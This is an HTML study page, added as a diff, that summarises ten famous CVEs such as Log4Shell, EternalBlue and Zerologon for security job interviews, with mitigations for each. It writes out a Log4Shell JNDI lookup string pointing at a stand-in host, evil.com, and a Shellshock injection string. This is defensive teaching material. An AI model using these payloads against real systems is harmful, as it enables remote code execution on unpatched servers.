@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Famous CVEs You Must Know | VM Docs</title>
+    <link rel="stylesheet" href="main.css">
+</head>
+<body>
+    <div class="layout">
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <a href="index.html" class="sidebar-logo">
+                    <div class="sidebar-logo-icon">🛡️</div>
+                    <div class="sidebar-logo-text"><span>VM</span>DOCS</div>
+                </a>
+            </div>
+        </aside>
+
+        <main class="main-content">
+            <div class="page-header">
+                <h1>🔥 Famous CVEs You Must Know</h1>
+                <p class="page-description">The critical vulnerabilities that changed security history. Know these for interviews!</p>
+            </div>
+
+            <div class="content-body">
+
+                <div class="eli5-box">
+                    <strong>Why memorize CVEs?</strong><br><br>
+                    Interviewers LOVE asking about specific vulnerabilities. Knowing these shows you're current, you understand real-world threats, and you can speak technically. These are the "celebrity vulnerabilities" everyone in security knows.
+                </div>
+
+                <h2>🏆 The Hall of Fame - Top 10 CVEs</h2>
+
+                <h3>1. Log4Shell (CVE-2021-44228)</h3>
+                <div class="memory-box">
+                    <div class="memory-box-title">🧠 Log4Shell - "The Perfect Storm"</div>
+                    <p>
+                        <strong>What:</strong> Remote Code Execution in Apache Log4j (Java logging library)<br>
+                        <strong>CVSS:</strong> 10.0 (Critical)<br>
+                        <strong>Attack:</strong> Inject <code>${jndi:ldap://evil.com/exploit}</code> into any logged field<br>
+                        <strong>Impact:</strong> Full system takeover - no authentication needed<br><br>
+                        <strong>Why Famous:</strong>
+                        <ul>
+                            <li>Log4j used in MILLIONS of applications</li>
+                            <li>Trivially exploitable (just put payload in User-Agent)</li>
+                            <li>Zero-click, no auth, remote</li>
+                            <li>Affected Minecraft, Apple, Amazon, Twitter, etc.</li>
+                        </ul>
+                    </p>
+                    <div class="quick-recall">
+                        <div class="quick-recall-title">Interview Memory Hook</div>
+                        "Log4j JNDI injection - attacker injects lookup string, server fetches and executes malicious code. Classic SSRF to RCE. Fix: upgrade to 2.17.0+ or remove JndiLookup class."
+                    </div>
+                </div>
+
+                <h3>2. EternalBlue (CVE-2017-0144)</h3>
+                <div class="memory-box">
+                    <div class="memory-box-title">🧠 EternalBlue - "The Worm That Crippled the World"</div>
+                    <p>
+                        <strong>What:</strong> SMBv1 Buffer Overflow in Windows<br>
+                        <strong>Port:</strong> 445 (SMB)<br>
+                        <strong>CVSS:</strong> 9.8 (Critical)<br>
+                        <strong>Attack:</strong> Send malformed SMB packets → RCE<br><br>
+                        <strong>Why Famous:</strong>
+                        <ul>
+                            <li>Developed by NSA, leaked by Shadow Brokers</li>
+                            <li>Powered WannaCry ransomware (200,000+ systems)</li>
+                            <li>Powered NotPetya ($10B+ damage)</li>
+                            <li>WORMABLE - spreads automatically</li>
+                        </ul>
+                    </p>
+                    <div class="quick-recall">
+                        <div class="quick-recall-title">Interview Memory Hook</div>
+                        "EternalBlue = SMBv1 on port 445. Wormable, pre-auth RCE. Mitigation: disable SMBv1, block port 445 at perimeter, patch MS17-010."
+                    </div>
+                </div>
+
+                <h3>3. Zerologon (CVE-2020-1472)</h3>
+                <div class="memory-box">
+                    <div class="memory-box-title">🧠 Zerologon - "Domain Admin in 3 Seconds"</div>
+                    <p>
+                        <strong>What:</strong> Netlogon cryptographic flaw (AES-CFB8 implementation)<br>
+                        <strong>Port:</strong> 445 (RPC over SMB)<br>
+                        <strong>CVSS:</strong> 10.0 (Critical)<br>
+                        <strong>Attack:</strong> Send all-zero client challenge → authenticate as any computer → reset DC password<br><br>
+                        <strong>Why Famous:</strong>
+                        <ul>
+                            <li>Complete Active Directory takeover in SECONDS</li>
+                            <li>No authentication needed</li>
+                            <li>Any DC accessible = game over</li>
+                        </ul>
+                    </p>
+                    <div class="quick-recall">
+                        <div class="quick-recall-title">Interview Memory Hook</div>
+                        "Zerologon = cryptographic flaw in Netlogon. All-zero IV attack. Instant DC compromise. Mitigation: August 2020 patch + enforce secure Netlogon."
+                    </div>
+                </div>
+
+                <h3>4. ProxyLogon (CVE-2021-26855)</h3>
+                <div class="memory-box">
+                    <div class="memory-box-title">🧠 ProxyLogon - "Exchange Backdoor"</div>
+                    <p>
+                        <strong>What:</strong> Exchange Server SSRF leading to authentication bypass<br>
+                        <strong>Port:</strong> 443 (HTTPS)<br>
+                        <strong>CVSS:</strong> 9.8 (Critical)<br>
+                        <strong>Attack:</strong> SSRF → Auth bypass → Webshell drop<br><br>
+                        <strong>Why Famous:</strong>
+                        <ul>
+                            <li>Exploited by HAFNIUM (China state actor)</li>
+                            <li>30,000+ organizations compromised</li>
+                            <li>Part of a 4-CVE chain</li>
+                            <li>Webshells persisted for months</li>
+                        </ul>
+                    </p>
+                    <div class="quick-recall">
+                        <div class="quick-recall-title">Interview Memory Hook</div>
+                        "ProxyLogon = Exchange SSRF to auth bypass. Pre-auth, internet-facing, mass exploitation. Mitigation: emergency patches, hunt for webshells."
+                    </div>
+                </div>
+
+                <h3>5. PrintNightmare (CVE-2021-34527)</h3>
+                <div class="memory-box">
+                    <div class="memory-box-title">🧠 PrintNightmare - "The Printer That Pwned You"</div>
+                    <p>
+                        <strong>What:</strong> Windows Print Spooler RCE<br>
+                        <strong>Service:</strong> Spooler (runs as SYSTEM)<br>
+                        <strong>CVSS:</strong> 8.8 (High)<br>
+                        <strong>Attack:</strong> Load malicious DLL via printer driver → SYSTEM privileges<br><br>
+                        <strong>Why Famous:</strong>
+                        <ul>
+                            <li>Spooler enabled by default on ALL Windows</li>
+                            <li>Runs as SYSTEM = highest privilege</li>
+                            <li>Even DCs had it enabled!</li>
+                            <li>Multiple variants emerged</li>
+                        </ul>
+                    </p>
+                    <div class="quick-recall">
+                        <div class="quick-recall-title">Interview Memory Hook</div>
+                        "PrintNightmare = Print Spooler RCE. Loads malicious DLL, runs as SYSTEM. Mitigation: disable Print Spooler on servers/DCs, apply patches."
+                    </div>
+                </div>
+
+                <h3>6. Heartbleed (CVE-2014-0160)</h3>
+                <div class="memory-box">
+                    <div class="memory-box-title">🧠 Heartbleed - "The One That Broke the Internet"</div>
+                    <p>
+                        <strong>What:</strong> OpenSSL TLS heartbeat memory disclosure<br>
+                        <strong>Port:</strong> 443 (any TLS)<br>
+                        <strong>CVSS:</strong> 7.5 (High)<br>
+                        <strong>Attack:</strong> Malformed heartbeat request → leak up to 64KB of memory<br><br>
+                        <strong>What Leaked:</strong>
+                        <ul>
+                            <li>Private keys</li>
+                            <li>Session cookies</li>
+                            <li>Passwords in memory</li>
+                            <li>User data</li>
+                        </ul>
+                    </p>
+                    <div class="quick-recall">
+                        <div class="quick-recall-title">Interview Memory Hook</div>
+                        "Heartbleed = OpenSSL memory leak. Read server memory including private keys. Mitigation: patch OpenSSL, rotate certificates."
+                    </div>
+                </div>
+
+                <h3>7. Shellshock (CVE-2014-6271)</h3>
+                <div class="memory-box">
+                    <div class="memory-box-title">🧠 Shellshock - "Bash Goes Boom"</div>
+                    <p>
+                        <strong>What:</strong> Bash shell environment variable code injection<br>
+                        <strong>CVSS:</strong> 9.8 (Critical)<br>
+                        <strong>Attack:</strong> <code>() { :; }; /bin/bash -c "malicious"</code> in any env var<br><br>
+                        <strong>Attack Vectors:</strong>
+                        <ul>
+                            <li>CGI scripts (User-Agent → env var)</li>
+                            <li>DHCP clients</li>
+                            <li>SSH ForceCommand</li>
+                        </ul>
+                    </p>
+                    <div class="quick-recall">
+                        <div class="quick-recall-title">Interview Memory Hook</div>
+                        "Shellshock = Bash env var injection. Function definition executes trailing commands. Affected CGI, DHCP, SSH. Patch Bash immediately."
+                    </div>
+                </div>
+
+                <h3>8. Spring4Shell (CVE-2022-22965)</h3>
+                <div class="memory-box">
+                    <div class="memory-box-title">🧠 Spring4Shell - "Log4j's Cousin"</div>
+                    <p>
+                        <strong>What:</strong> Spring Framework RCE via data binding<br>
+                        <strong>CVSS:</strong> 9.8 (Critical)<br>
+                        <strong>Requirements:</strong> JDK 9+, Spring MVC, WAR deployment on Tomcat<br>
+                        <strong>Attack:</strong> Manipulate class loader to write webshell<br><br>
+                        <strong>Note:</strong> Less impactful than Log4Shell due to specific requirements
+                    </p>
+                </div>
+
+                <h3>9. Dirty Pipe (CVE-2022-0847)</h3>
+                <div class="memory-box">
+                    <div class="memory-box-title">🧠 Dirty Pipe - "Linux Root in Seconds"</div>
+                    <p>
+                        <strong>What:</strong> Linux kernel pipe buffer overflow<br>
+                        <strong>CVSS:</strong> 7.8 (High)<br>
+                        <strong>Attack:</strong> Overwrite read-only files (like /etc/passwd)<br>
+                        <strong>Impact:</strong> Local privilege escalation to root<br><br>
+                        <strong>Affected:</strong> Linux kernel 5.8+
+                    </p>
+                    <div class="quick-recall">
+                        <div class="quick-recall-title">Interview Memory Hook</div>
+                        "Dirty Pipe = Linux kernel pipe vulnerability. Overwrites read-only files. Local privesc to root. Patch kernel."
+                    </div>
+                </div>
+
+                <h3>10. SolarWinds/SUNBURST (CVE-2020-10148)</h3>
+                <div class="memory-box">
+                    <div class="memory-box-title">🧠 SUNBURST - "The Supply Chain Nightmare"</div>
+                    <p>
+                        <strong>What:</strong> Trojanized SolarWinds Orion update<br>
+                        <strong>Type:</strong> Supply chain attack (not a traditional CVE)<br>
+                        <strong>Attack:</strong> Malicious code inserted into legitimate software update<br><br>
+                        <strong>Impact:</strong>
+                        <ul>
+                            <li>18,000+ organizations downloaded backdoor</li>
+                            <li>US government agencies compromised</li>
+                            <li>Attributed to Russian APT29</li>
+                            <li>Demonstrated supply chain risk</li>
+                        </ul>
+                    </p>
+                    <div class="quick-recall">
+                        <div class="quick-recall-title">Interview Memory Hook</div>
+                        "SUNBURST = supply chain attack via SolarWinds Orion. Malicious update, sophisticated C2. Lesson: validate software supply chain, monitor for anomalies."
+                    </div>
+                </div>
+
+                <h2>📊 CVE Quick Reference Table</h2>
+
+                <div class="quick-recall">
+                    <div class="quick-recall-title">At-a-Glance Summary</div>
+                    <table>
+                        <thead>
+                            <tr><th>CVE</th><th>Name</th><th>Type</th><th>Key Port/Service</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>CVE-2021-44228</td><td>Log4Shell</td><td>RCE</td><td>Any (logged input)</td></tr>
+                            <tr><td>CVE-2017-0144</td><td>EternalBlue</td><td>RCE (Worm)</td><td>445/SMB</td></tr>
+                            <tr><td>CVE-2020-1472</td><td>Zerologon</td><td>Priv Esc</td><td>445/Netlogon</td></tr>
+                            <tr><td>CVE-2021-26855</td><td>ProxyLogon</td><td>SSRF→RCE</td><td>443/Exchange</td></tr>
+                            <tr><td>CVE-2021-34527</td><td>PrintNightmare</td><td>RCE/Priv Esc</td><td>Spooler Service</td></tr>
+                            <tr><td>CVE-2014-0160</td><td>Heartbleed</td><td>Info Disclosure</td><td>443/OpenSSL</td></tr>
+                            <tr><td>CVE-2014-6271</td><td>Shellshock</td><td>RCE</td><td>CGI/Bash</td></tr>
+                            <tr><td>CVE-2022-22965</td><td>Spring4Shell</td><td>RCE</td><td>Spring/Tomcat</td></tr>
+                            <tr><td>CVE-2022-0847</td><td>Dirty Pipe</td><td>Priv Esc</td><td>Linux kernel</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h2>🎯 Linux Privilege Escalation CVEs</h2>
+
+                <div class="quick-recall">
+                    <div class="quick-recall-title">Linux Privesc Hall of Fame</div>
+                    <table>
+                        <tr><td><strong>Dirty COW</strong></td><td>CVE-2016-5195</td><td>Race condition in copy-on-write</td></tr>
+                        <tr><td><strong>Dirty Pipe</strong></td><td>CVE-2022-0847</td><td>Pipe buffer overwrite</td></tr>
+                        <tr><td><strong>PwnKit</strong></td><td>CVE-2021-4034</td><td>Polkit pkexec SUID</td></tr>
+                        <tr><td><strong>Baron Samedit</strong></td><td>CVE-2021-3156</td><td>Sudo heap overflow</td></tr>
+                    </table>
+                </div>
+
+                <a href="index.html" class="page-nav-link" style="display: inline-block; margin-top: 30px;">
+                    ← Back to Documentation Home
+                </a>
+            </div>
+        </main>
+    </div>
+    <script src="main.js"></script>
+</body>
+</html>
